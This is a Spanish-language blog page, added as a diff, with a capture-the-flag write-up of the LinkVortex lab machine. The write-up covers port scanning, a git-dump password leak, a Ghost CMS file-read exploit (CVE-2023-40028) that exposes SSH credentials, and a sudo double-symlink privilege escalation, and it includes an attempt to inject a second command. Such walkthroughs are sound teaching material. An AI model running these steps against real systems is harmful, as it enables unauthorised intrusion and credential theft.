@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Linkvortex | Borhub Blog</title>
+<meta name="keywords" content="Linkvortex, Easy, Linux, Git Dump, Vhost, Symlink Trickery">
+<meta name="description" content="Writeup sobre la máquina LinkVortex, Linux de dificultad Easy. En el reconocimiento inicial de puertos descubriremos la existencia de una página web expuesta en el puerto 80. Luego realizando fuzzing de directorios y vhost descubriremos un leak de credenciales para conseguir acceso al panel de administración del web, luego mediante el CVE-2023-40028 conseguiremos leer las credenciales para conseguir el user.txt. Para finalizar con la escalada usaremos los permisos sudo que tiene nuestro usuario junto symlink trickery para hacernos con la root flag.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/linkvortex/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c6701118f5c7e049c5fa8762210566ca9a5a1174e56560126f872ccc4e942a1.css" integrity="sha256-DGcBEY9cfgScX6h2IhBWbKmloRdOVlYBJvhyzMTpQqE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/linkvortex/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/linkvortex/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Linkvortex">
+  <meta property="og:description" content="Writeup sobre la máquina LinkVortex, Linux de dificultad Easy. En el reconocimiento inicial de puertos descubriremos la existencia de una página web expuesta en el puerto 80. Luego realizando fuzzing de directorios y vhost descubriremos un leak de credenciales para conseguir acceso al panel de administración del web, luego mediante el CVE-2023-40028 conseguiremos leer las credenciales para conseguir el user.txt. Para finalizar con la escalada usaremos los permisos sudo que tiene nuestro usuario junto symlink trickery para hacernos con la root flag.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Linkvortex">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Git Dump">
+    <meta property="article:tag" content="Vhost">
+    <meta property="article:tag" content="Symlink Trickery">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/linkvortex.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/linkvortex.png">
+<meta name="twitter:title" content="Linkvortex">
+<meta name="twitter:description" content="Writeup sobre la máquina LinkVortex, Linux de dificultad Easy. En el reconocimiento inicial de puertos descubriremos la existencia de una página web expuesta en el puerto 80. Luego realizando fuzzing de directorios y vhost descubriremos un leak de credenciales para conseguir acceso al panel de administración del web, luego mediante el CVE-2023-40028 conseguiremos leer las credenciales para conseguir el user.txt. Para finalizar con la escalada usaremos los permisos sudo que tiene nuestro usuario junto symlink trickery para hacernos con la root flag.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Linkvortex",
+      "item": "https://borhuub.github.io/writeups/linkvortex/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Linkvortex",
+  "name": "Linkvortex",
+  "description": "Writeup sobre la máquina LinkVortex, Linux de dificultad Easy. En el reconocimiento inicial de puertos descubriremos la existencia de una página web expuesta en el puerto 80. Luego realizando fuzzing de directorios y vhost descubriremos un leak de credenciales para conseguir acceso al panel de administración del web, luego mediante el CVE-2023-40028 conseguiremos leer las credenciales para conseguir el user.txt. Para finalizar con la escalada usaremos los permisos sudo que tiene nuestro usuario junto symlink trickery para hacernos con la root flag.",
+  "keywords": [
+    "Linkvortex", "Easy", "Linux", "Git Dump", "Vhost", "Symlink Trickery"
+  ],
+  "articleBody": "Reconocimiento Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST Initiating SYN Stealth Scan at 14:48 Scanning 10.10.11.47 [65535 ports] Discovered open port 22/tcp on 10.10.11.47 Discovered open port 80/tcp on 10.10.11.47 Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports) Nmap scan report for 10.10.11.47 Host is up, received user-set (0.036s latency). Scanned at 2025-04-06 14:48:30 CEST for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB) Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.\n❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! Una vez tenemos los puertos copiados vamos a volver a usar nmap pero esta vez para hacer un escaneo de los servicios que están corriendo tras los puertos.\n❯ sudo nmap -sCV -p22,80 10.10.11.47 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:50 CEST Nmap scan report for 10.10.11.47 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA) |_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519) 80/tcp open http Apache httpd |_http-title: Did not follow redirect to http://linkvortex.htb/ |_http-server-header: Apache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds Enumeración web ❯ whatweb 10.10.11.47 http://10.10.11.47 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.47], RedirectLocation[http://linkvortex.htb/], Title[301 Moved Permanently] http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge] Enumerar directorios - Gobuster Vamos a empezar a enumerar directorios con gobuster y de aquí lo más interesante que encontramos es un panel de login en /ghost.\n❯ gobuster dir -u http://linkvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://linkvortex.htb [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /about (Status: 200) [Size: 8284] /rss (Status: 200) [Size: 26682] /feed (Status: 200) [Size: 26682] /About (Status: 200) [Size: 8284] /RSS (Status: 200) [Size: 26682] /private (Status: 200) [Size: 12148] /unsubscribe (Status: 400) [Size: 24] /LICENSE (Status: 200) [Size: 1065] /cpu (Status: 200) [Size: 15472] /Rss (Status: 200) [Size: 26682] /ram (Status: 200) [Size: 14746] /ghost (Status: 200) [Size: 3787] /psu (Status: 200) [Size: 15163] /Private (Status: 200) [Size: 12148] /Feed (Status: 200) [Size: 26682] /Ghost (Status: 200) [Size: 3787] /RAM (Status: 200) [Size: 14746] /vga (Status: 200) [Size: 15231] /CPU (Status: 200) [Size: 15472] /VGA (Status: 200) [Size: 15231] Progress: 55968 / 220560 (25.38%)^C [!] Keyboard interrupt detected, terminating. Progress: 55970 / 220560 (25.38%) [ERROR] context canceled =============================================================== Finished =============================================================== Enumerar vhosts - Gobuster He estado mirando pero por el momento como no he encontrado ninguna vulnerabilidad en el panel, voy a seguir enumerando pero esta vez subdominios. Aquí conseguimos enumerar el subdominio dev.linkvortex.htb\nNos sale un cartel diciendo que la página aún esta en construcción, nosotros por el momento vamos a hacerle un listado de directorios para ver si sacamos algo más de información.\nEn un principio no me listaba nada con diretorios y he estado probando diccionarios hasta que he probado uno sobre metafiles y me ha descubierto el directorio .git/.\nEnumeración directorios - Ffuf ❯ ffuf -w /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt:FUZZ -u http://dev.linkvortex.htb/FUZZ -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://dev.linkvortex.htb/FUZZ :: Wordlist : FUZZ: /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 403 ________________________________________________ .git/packed-refs [Status: 200, Size: 147, Words: 8, Lines: 4, Duration: 103ms] .git/description [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 103ms] .git/logs/HEAD [Status: 200, Size: 175, Words: 8, Lines: 2, Duration: 103ms] .git [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms] .git/config [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 103ms] .git/HEAD [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 102ms] .git/ [Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 102ms] .git/index [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 103ms] :: Progress: [118/118] :: Job [1/1] :: 132 req/sec :: Duration: [0:00:01] :: Errors: 0 :: Para trabajar mejor con un entorno git y ver si encuentro algo interesante voy a dumperame el git a mi maquina local para navegar cómodamente.\nGit dump - Password Leak ❯ python3 -m venv entorno_virtual source entorno_virtual/bin/activate pip install git-dumper cd /home/borhub/Workspace/HTB/linkvortex/CONTENT/git/entorno_virtual git-dumper http://dev.linkvortex.htb/.git ./git Luego de haber estado buscando un buen rato he encontrado lo que podrían ser unas credenciales en /ghost/core/test/regressions/api/admin/authentication.test.js\nit('complete setup', async function () { const email = 'test@example.com'; const password = 'OctopiFociPilfer45'; Aquí realmente solo tenemos un ejemplo de contraseña pero antes habíamos visto en la web que un usuario llamado admin tenia varias publicaciones.\nCon lo cual vamos a probar con el nombre de usuario + el dominio de la pagina web, junto con la contraseña que hemos visto en los archivos del .git/. Y así entramos al dashboard de la pagina web.\nAcceso inicial CVE-2023-40028: Ghost CMS Arbitrary File Read En el whatweb anterior veíamos la versión de Ghost que se estaba usando, la 5.58. Ahora que estamos dentro de su panel vamos a buscar posibles vulnerabilidades.\nGhost es un sistema de gestión de contenidos (CMS) de código abierto. Las versiones anteriores a la 5.59.1 están sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simbólicos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitrión.\nhttps://github.com/godylockz/CVE-2023-40028/tree/main\nUtilizando este script en python conseguimos leer el archivo /etc/passwd y ademas nos recomienda leer otros archivo de configuración en el cual hay unas credenciales también.\n❯ python3 cve-2023-40028.py -t http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45 [*] Checking authentication (username/password) ... [+] Admin session created successfully. Welcome to the Ghost file-read shell. Type help or ? to list commands. file\u003e /var/lib/ghost/config.production.json { \"url\": \"http://localhost:2368\", \"server\": { \"port\": 2368, \"host\": \"::\" }, \"mail\": { \"transport\": \"Direct\" }, \"logging\": { \"transports\": [\"stdout\"] }, \"process\": \"systemd\", \"paths\": { \"contentPath\": \"/var/lib/ghost/content\" }, \"spam\": { \"user_login\": { \"minWait\": 1, \"maxWait\": 604800000, \"freeRetries\": 5000 } }, \"mail\": { \"transport\": \"SMTP\", \"options\": { \"service\": \"Google\", \"host\": \"linkvortex.htb\", \"port\": 587, \"auth\": { \"user\": \"bob@linkvortex.htb\", \"pass\": \"fibber-talented-worth\" } } } } file\u003e Probamos a meter las credenciales obtenidas por ssh y obtenemos la terminal.\n❯ ssh bob@10.10.11.47 bob@10.10.11.47's password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Apr 6 17:56:25 2025 from 10.10.14.74 bob@linkvortex:~$ cat user.txt 2c7f66b6d4d0******************** Escalada de privilegios Cuando hacemos sudo -l vemos que nuestro usuario tiene permiso para ejecutar un archivo .sh como administrador sin necesidad de poner contraseña adjuntado un archivo acabado en .png.\nbob@linkvortex:/opt/ghost$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png En un principio he intentado ejecutar comandos luego del archivo .png, pero detecta el uso de un segundo comando y es ahí cuando me pide la contraseña y ya el código no me deja ejecutar el comando.\nbob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh \"prueba.png; whoami\" [sudo] password for bob: Sorry, user bob is not allowed to execute '/usr/bin/bash /opt/ghost/clean_symlink.sh prueba.png; whoami' as root on linkvortex. Symlink Trickery y Abuso de CHECK_CONTENT Luego de revisar el código vi que el script revisa si el link simbólico del archivo .png para comprobar si contiene archivos sensibles como root o etc.\nCon lo cual para evitar esto vamos a hacer un bypass para engañar el filtro. Lo que haremos será lo siguiente hacer que el archivo al que apunta el .png sea un archivo cualquiera que luego apunta a /root/root.txt.\nhit-png -\u003e /home/bob/hit.txt | /home/bob/hit.txt -\u003e /root/root.txt\nbob@linkvortex:~$ ln -s /root/root.txt hit.txt bob@linkvortex:~$ ln -s /home/bob/hit.txt hit.png Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionará.\nSi ahora ejecutamos el script funcionará pero no podremos ver el contenido ya que el CHECK_CONTENT por defecto esta como ==false==.\n#codigo del script y porque no nos muestra el contenido if $CHECK_CONTENT;then /usr/bin/echo \"Content:\" /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u003e/dev/null fi bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png Entonces le indicamos en el script que ponga el CHECK_CONTENT en true para que nos muestre la flag.\nbob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png Link found [ /home/bob/hit.png ] , moving it to quarantine Content: 46df14************************** bob@linkvortex:~$ ",
+  "wordCount" : "1615",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/linkvortex.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/linkvortex/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Linkvortex
+    </h1>
+    <div class="post-description">
+      Writeup sobre la máquina LinkVortex, Linux de dificultad Easy. En el reconocimiento inicial de puertos descubriremos la existencia de una página web expuesta en el puerto 80. Luego realizando fuzzing de directorios y vhost descubriremos un leak de credenciales para conseguir acceso al panel de administración del web, luego mediante el CVE-2023-40028 conseguiremos leer las credenciales para conseguir el user.txt. Para finalizar con la escalada usaremos los permisos sudo que tiene nuestro usuario junto symlink trickery para hacernos con la root flag.
+    </div>
+    <div class="post-meta"><span>8 min</span>&nbsp;·&nbsp;<span>1615 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a><ul>
+                        
+                <li>
+                    <a href="#enumerar-directorios---gobuster" aria-label="Enumerar directorios - Gobuster">Enumerar directorios - Gobuster</a></li>
+                <li>
+                    <a href="#enumerar-vhosts---gobuster" aria-label="Enumerar vhosts - Gobuster">Enumerar vhosts - Gobuster</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-directorios---ffuf" aria-label="Enumeración directorios - Ffuf">Enumeración directorios - Ffuf</a></li>
+                <li>
+                    <a href="#git-dump---password-leak" aria-label="Git dump - Password Leak">Git dump - Password Leak</a></li></ul>
+                </li>
+                <li>
+                    <a href="#acceso-inicial" aria-label="Acceso inicial">Acceso inicial</a><ul>
+                        
+                <li>
+                    <a href="#cve-2023-40028-ghost-cms-arbitrary-file-read" aria-label="CVE-2023-40028: Ghost CMS Arbitrary File Read">CVE-2023-40028: Ghost CMS Arbitrary File Read</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#symlink-trickery-y-abuso-de-check_content" aria-label="Symlink Trickery y Abuso de CHECK_CONTENT">Symlink Trickery y Abuso de CHECK_CONTENT</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<p>Vamos a empezar el reconocimiento con un <code>Nmap</code> para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado <code>ports</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.47 -oG ports
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-04-06 14:48 CEST
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 14:48
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.47 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 22/tcp on 10.10.11.47
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.11.47
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 14:48, 10.90s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.47
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.036s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-04-06 14:48:30 CEST <span class="k">for</span> 11s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp open ssh syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp open http syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.95 seconds
+</span></span><span class="line"><span class="cl">Raw packets sent: <span class="m">65672</span> <span class="o">(</span>2.890MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65535</span> <span class="o">(</span>2.621MB<span class="o">)</span>
+</span></span></code></pre></div><p>Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">➜ <span class="m">22</span>
+</span></span><span class="line"><span class="cl">➜ <span class="m">80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><p>Una vez tenemos los puertos copiados vamos a volver a usar nmap pero esta vez para hacer un escaneo de los servicios que están corriendo tras los puertos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p22,80 10.10.11.47 -oN targeted
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-04-06 14:50 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.47
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.29s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">256</span> 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ <span class="m">256</span> a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open http Apache httpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://linkvortex.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.61 seconds
+</span></span></code></pre></div><h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ whatweb 10.10.11.47
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://10.10.11.47 <span class="o">[</span><span class="m">301</span> Moved Permanently<span class="o">]</span> Apache, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTTPServer<span class="o">[</span>Apache<span class="o">]</span>, IP<span class="o">[</span>10.10.11.47<span class="o">]</span>, RedirectLocation<span class="o">[</span>http://linkvortex.htb/<span class="o">]</span>, Title<span class="o">[</span><span class="m">301</span> Moved Permanently<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
